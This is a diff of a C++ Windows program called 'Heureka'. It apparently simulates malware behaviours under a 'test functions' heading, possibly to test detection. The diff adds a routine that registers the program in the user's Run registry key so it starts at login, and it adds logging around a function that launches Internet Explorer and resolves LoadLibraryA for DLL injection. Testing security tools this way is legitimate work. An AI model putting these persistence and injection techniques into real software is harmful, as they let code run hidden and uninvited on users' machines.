@@ -1,6 +1,7 @@
 #include<iostream>
 #include<Windows.h>
 #include<ctime>
+#include<psapi.h>
 #include "heurekaconfig.h"
 
 // namespace setup
@@ -17,20 +18,54 @@ void print_error(const char *status){
 
 // test functions
 
+#if SET_STARTUP_REGISTRY==1
+void set_startup_registry(){
+	char mypath[MAX_PATH];
+	HKEY hk;
+	DWORD dwDisp;
+
+	print_status("set_startup_registry starts");
+	
+	GetModuleFileName( NULL, mypath, MAX_PATH );
+	
+	if (DWORD err=RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hk, &dwDisp)){
+		print_error("Could not create the registry key.");
+		return;
+	}
+	if (RegSetValueEx(hk,       // subkey handle 
+			"Heureka",			// value name 
+			0,                  // must be zero 
+			REG_SZ,      // value type 
+			(LPBYTE) mypath,	// pointer to value data 
+			(DWORD) (strlen(mypath)+1))) // data size
+	{
+      print_error("Could not set startup value."); 
+	}
+	RegCloseKey(hk); 
+	print_status("set_startup_registry ends");
+}
+#endif
+
 #if DLL_INJECT_IE==1
 void dll_inject_ie(){
 	STARTUPINFO si;
     PROCESS_INFORMATION pi;
 
+	print_status("dll_inject_ie starts");
+
 	HMODULE hKernel32=GetModuleHandle("Kernel32");
 	FARPROC aLoadLibrary=GetProcAddress(hKernel32,"LoadLibraryA");
 	
+    unsigned int i;
+
+
+
 	ZeroMemory(&si,sizeof(si));
 	si.cb=sizeof(si);
 	ZeroMemory(&pi,sizeof(pi));
-
+	
 	if( !CreateProcess( IE_PATH,   
-        (LPSTR)remote_url,        // Command line
+        "",				// Command line
         NULL,           // Process handle not inheritable
         NULL,           // Thread handle not inheritable
         FALSE,          // Set handle inheritance to FALSE
@@ -59,6 +94,7 @@ void dll_inject_ie(){
 	WaitForSingleObject(pi.hProcess, INFINITE );
 	CloseHandle(pi.hProcess);
 	CloseHandle(pi.hThread);
+	print_status("dll_inject_ie ends");
 }
 #endif
 
@@ -153,6 +189,9 @@ int main(int argc,char **argv){
 	dll_inject_ie();
 	#endif
 
+	#if SET_STARTUP_REGISTRY==1
+	set_startup_registry();
+	#endif
 	// clean up and exit
 	return 1;
 }
